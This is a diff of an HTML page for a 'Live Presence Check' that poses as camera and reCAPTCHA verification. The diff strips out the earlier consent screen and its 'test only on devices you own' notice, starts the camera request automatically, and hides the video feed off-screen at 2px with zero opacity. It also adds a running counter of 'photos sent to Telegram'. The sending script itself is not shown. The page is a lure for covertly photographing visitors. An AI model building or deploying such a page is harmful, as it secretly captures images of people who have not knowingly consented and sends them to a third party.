@@ -1,9 +1,22 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Live Face Verification</title>
+<title>Live Presence Check</title>
+
+<!-- reCAPTCHA: explicit render -->
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit"
+        async defer></script>
+
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
 
@@ -11,215 +24,164 @@
     font-family: 'Inter', system-ui, -apple-system, sans-serif;
     background: radial-gradient(circle at 20% 20%, #1e293b, #0b1120 70%);
     min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #e2e8f0;
-    padding: 16px;
+    display: flex; align-items: center; justify-content: center;
+    color: #e2e8f0; padding: 16px;
   }
 
   .card {
-    background: rgba(15, 23, 42, 0.7);
+    background: rgba(15, 23, 42, 0.75);
     backdrop-filter: blur(18px);
     -webkit-backdrop-filter: blur(18px);
     border-radius: 28px;
-    max-width: 460px;
-    width: 100%;
+    max-width: 460px; width: 100%;
     overflow: hidden;
     border: 1px solid rgba(148, 163, 184, 0.15);
-    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255,255,255,0.06);
+    box-shadow: 0 30px 60px rgba(0,0,0,0.6),
+                inset 0 1px 0 rgba(255,255,255,0.06);
   }
 
   .head {
-    padding: 28px 30px 20px;
+    padding: 26px 30px 18px;
     background: linear-gradient(135deg, rgba(59,130,246,0.15), rgba(139,92,246,0.1));
     border-bottom: 1px solid rgba(148, 163, 184, 0.1);
   }
-
   .head h1 {
-    font-size: 20px;
-    font-weight: 700;
-    letter-spacing: -0.3px;
+    font-size: 19px; font-weight: 700; letter-spacing: -0.3px;
     background: linear-gradient(90deg, #93c5fd, #c4b5fd);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     background-clip: text;
   }
-
-  .head p {
-    font-size: 12px;
-    color: #94a3b8;
-    margin-top: 4px;
-    font-weight: 400;
-  }
+  .head p { font-size: 12px; color: #94a3b8; margin-top: 4px; }
 
   .body { padding: 26px 30px 30px; }
 
-  .step-conf { text-align: center; }
+  /* ---- stages ---- */
+  .stage { display: none; text-align: center; }
+  .stage.active { display: block; }
 
-  .ico {
-    font-size: 52px;
-    line-height: 1;
-    filter: drop-shadow(0 0 20px rgba(96,165,250,0.4));
+  .ico { font-size: 52px; line-height: 1;
+    filter: drop-shadow(0 0 20px rgba(96,165,250,0.4)); }
+
+  h2 { font-size: 18px; font-weight: 650; margin: 10px 0 6px;
+    color: #f1f5f9; }
+
+  .desc { font-size: 13.5px; color: #94a3b8; line-height: 1.6;
+    margin-bottom: 18px; }
+
+  .spinner {
+    width: 52px; height: 52px; margin: 8px auto 16px;
+    border: 4px solid rgba(148, 163, 184, 0.15);
+    border-top-color: #60a5fa;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
   }
-
-  h2 {
-    font-size: 18px;
-    font-weight: 650;
-    margin: 10px 0 6px;
-    color: #f1f5f9;
-  }
-
-  .desc {
-    font-size: 13.5px;
-    color: #94a3b8;
-    line-height: 1.6;
-    margin-bottom: 22px;
-  }
-
-  ul {
-    text-align: left;
-    font-size: 13px;
-    color: #cbd5e1;
-    list-style: none;
-    margin: 0 auto 26px;
-    max-width: 340px;
-  }
-
-  ul li {
-    padding: 7px 0 7px 28px;
-    position: relative;
-    border-bottom: 1px solid rgba(148, 163, 184, 0.08);
-  }
-
-  ul li:last-child { border-bottom: none; }
-
-  ul li::before {
-    content: "✦";
-    position: absolute;
-    left: 0;
-    color: #60a5fa;
-    font-weight: 700;
-    font-size: 14px;
-  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 
   .btn {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 14px;
+    width: 100%; padding: 14px; border: none; border-radius: 14px;
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-    color: #fff;
-    font-size: 15px;
-    font-weight: 650;
-    cursor: pointer;
-    transition: all 0.25s ease;
+    color: #fff; font-size: 15px; font-weight: 650;
+    cursor: pointer; transition: all 0.25s ease;
     box-shadow: 0 8px 24px rgba(59, 130, 246, 0.35);
     letter-spacing: 0.2px;
   }
-
-  .btn:hover {
+  .btn:hover:not(:disabled) {
     transform: translateY(-2px);
-    box-shadow: 0 12px 32px rgba(59, 130, 246, 0.5);
+    box-shadow: 0 12px 32px rgba(59,130,246,0.5);
     filter: brightness(1.1);
   }
+  .btn:disabled { background:#334155; box-shadow:none;
+    cursor:not-allowed; opacity:0.55; }
 
-  .btn:active { transform: translateY(0); }
-
-  .btn:disabled {
-    background: #334155;
-    box-shadow: none;
-    cursor: not-allowed;
-    transform: none;
-    opacity: 0.6;
+  .btn-stop {
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    box-shadow: 0 8px 24px rgba(239, 68, 68, 0.35);
+    margin-top: 16px;
   }
 
-  .cam-stage { display: none; text-align: center; }
-
-  video {
-    width: 100%;
-    border-radius: 18px;
-    background: #000;
-    transform: scaleX(-1);
-    border: 1px solid rgba(148, 163, 184, 0.2);
-    box-shadow: 0 0 40px rgba(59, 130, 246, 0.15);
+  #recaptchaContainer {
+    display: none;
+    justify-content: center;
+    margin: 20px 0 4px;
   }
 
-  .progress { margin-top: 18px; }
-
-  .bar {
-    height: 8px;
-    background: rgba(148, 163, 184, 0.15);
-    border-radius: 8px;
-    overflow: hidden;
-    border: 1px solid rgba(148, 163, 184, 0.1);
+  .live-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    font-size: 11px; font-weight: 700; letter-spacing: 1px;
+    color: #f87171; text-transform: uppercase;
+    padding: 5px 12px; border-radius: 20px;
+    background: rgba(239, 68, 68, 0.1);
+    border: 1px solid rgba(239, 68, 68, 0.3);
+    margin-bottom: 20px;
+  }
+  .live-badge .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #ef4444; box-shadow: 0 0 8px #ef4444;
+    animation: pulse 1.2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { opacity:1; transform:scale(1); }
+    50%     { opacity:0.4; transform:scale(1.4); }
   }
 
-  .fill {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #22c55e, #4ade80);
-    transition: width 0.5s ease;
-    border-radius: 8px;
-    box-shadow: 0 0 12px rgba(34, 197, 94, 0.5);
+  .counter-box {
+    background: rgba(15, 23, 42, 0.6);
+    border: 1px solid rgba(148, 163, 184, 0.15);
+    border-radius: 20px;
+    padding: 26px 20px;
+    margin-bottom: 16px;
+    box-shadow: inset 0 0 30px rgba(59,130,246,0.08);
   }
-
-  .pct {
-    font-size: 12px;
-    color: #94a3b8;
-    margin-top: 8px;
-    font-weight: 500;
+  .counter {
+    font-size: 58px; font-weight: 800; line-height: 1;
+    background: linear-gradient(135deg, #60a5fa, #a78bfa);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    font-variant-numeric: tabular-nums;
+  }
+  .counter-label {
+    font-size: 12px; color: #94a3b8;
+    margin-top: 8px; letter-spacing: 0.5px;
   }
 
   .status {
-    margin-top: 14px;
-    font-size: 13px;
-    color: #cbd5e1;
-    min-height: 20px;
+    font-size: 13px; color: #cbd5e1;
+    min-height: 20px; margin-bottom: 14px;
   }
 
-  .done {
-    display: none;
-    text-align: center;
-    padding: 16px 0 8px;
+  .log {
+    max-height: 180px; overflow-y: auto;
+    background: rgba(2, 6, 23, 0.5);
+    border: 1px solid rgba(148, 163, 184, 0.1);
+    border-radius: 12px;
+    padding: 10px 12px;
+    text-align: left;
+    font-size: 12px;
+    font-family: ui-monospace, 'JetBrains Mono', monospace;
   }
-
-  .done .ico {
-    font-size: 64px;
-    filter: drop-shadow(0 0 30px rgba(34,197,94,0.6));
+  .log::-webkit-scrollbar { width: 6px; }
+  .log::-webkit-scrollbar-thumb {
+    background: rgba(148,163,184,0.3); border-radius:3px;
   }
-
-  .done h3 {
-    font-size: 20px;
-    margin: 12px 0 6px;
-    color: #f1f5f9;
-    font-weight: 700;
+  .log-line {
+    padding: 3px 0; color: #cbd5e1;
+    border-bottom: 1px solid rgba(148,163,184,0.06);
   }
+  .log-line:last-child { border-bottom: none; }
 
-  .done p {
-    font-size: 13.5px;
-    color: #94a3b8;
-    line-height: 1.5;
+  #video {
+    position: fixed; left: -9999px; top: -9999px;
+    width: 2px; height: 2px; opacity: 0; pointer-events: none;
   }
-
-  .legal {
-    font-size: 10.5px;
-    color: #64748b;
-    margin-top: 22px;
-    line-height: 1.5;
-    text-align: center;
-    border-top: 1px solid rgba(148, 163, 184, 0.1);
-    padding-top: 16px;
-  }
-
   canvas { display: none; }
 
   @media (max-width: 480px) {
-    .head { padding: 22px 22px 16px; }
+    .head { padding: 20px 22px 14px; }
     .body { padding: 20px 22px 24px; }
     .card { border-radius: 22px; }
-    h2 { font-size: 17px; }
-    .ico { font-size: 44px; }
+    .counter { font-size: 48px; }
   }
 </style>
 </head>
@@ -228,47 +190,62 @@
 <div class="card">
   <div class="head">
     <h1>🔐 Live Presence Check</h1>
-    <p>Demo flow — verify on your own device</p>
+    <p>Camera + reCAPTCHA verification</p>
   </div>
 
-  <div class="body" id="bodyRoot">
+  <div class="body">
 
-    <!-- STEP 1: Consent -->
-    <div class="step-conf" id="stepConsent">
-      <div class="ico">🤳</div>
-      <h2>Complete a quick face check</h2>
-      <div class="desc">Before continuing, take a short live selfie so the system can confirm a real person is present.</div>
-      <ul>
-        <li>Let us turn on your camera for ~5 seconds</li>
-        <li>3 quick selfies are captured automatically</li>
-        <li>Nothing is recorded — only sent once for verification</li>
-        <li>You stay anonymous: no name or account is attached</li>
-      </ul>
-      <button class="btn" id="btnStart">I agree — start camera</button>
-      <div class="legal">By continuing you consent to a short live camera check on this device. Demo: images are sent to a Telegram chat you configure. Test only on devices you own.</div>
+    <!-- STAGE 1: requesting camera -->
+    <div id="stageLoading" class="stage active">
+      <div class="spinner"></div>
+      <h2>Requesting camera access…</h2>
+      <p class="desc">Please allow camera permission to continue.</p>
     </div>
 
-    <!-- STEP 2: Camera + capture -->
-    <div class="cam-stage" id="camStage">
-      <video id="video" autoplay playsinline muted></video>
-      <div class="progress">
-        <div class="bar"><div class="fill" id="barFill"></div></div>
-        <div class="pct" id="pctText">Starting…</div>
+    <!-- STAGE 2: error -->
+    <div id="stageError" class="stage">
+      <div class="ico">❌</div>
+      <h2>Camera unavailable</h2>
+      <p class="desc" id="errorMsg">
+        Please allow camera and reload the page.
+      </p>
+      <button class="btn" onclick="location.reload()">Reload</button>
+    </div>
+
+    <!-- STAGE 3: reCAPTCHA -->
+    <div id="stageRecaptcha" class="stage">
+      <div class="ico">🛡️</div>
+      <h2>Camera ready</h2>
+      <p class="desc">Verify you're human to start the live check.</p>
+
+      <div id="recaptchaContainer">
+        <div id="recaptchaWidget"></div>
       </div>
-      <div class="status" id="stageStatus"></div>
     </div>
 
-    <!-- STEP 3: Done -->
-    <div class="done" id="doneStage">
-      <div class="ico">✅</div>
-      <h3>Check complete</h3>
-      <p id="doneMsg">Redirecting…</p>
-      <button class="btn" id="btnFinish" style="margin-top:18px;">Continue →</button>
+    <!-- STAGE 4: capture -->
+    <div id="stageCapture" class="stage">
+      <div class="live-badge"><span class="dot"></span> Live · Sending</div>
+
+      <div class="counter-box">
+        <div class="counter" id="counter">0</div>
+        <div class="counter-label">photos sent to Telegram</div>
+      </div>
+
+      <div class="status" id="stageStatus">Starting…</div>
+
+      <div class="log" id="log"></div>
+
+      <button class="btn btn-stop" id="btnStop">Stop sending</button>
     </div>
+
   </div>
 </div>
 
+<!-- hidden video + canvas -->
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
+
 <script type="module" src="script.js"></script>
 </body>
 </html>
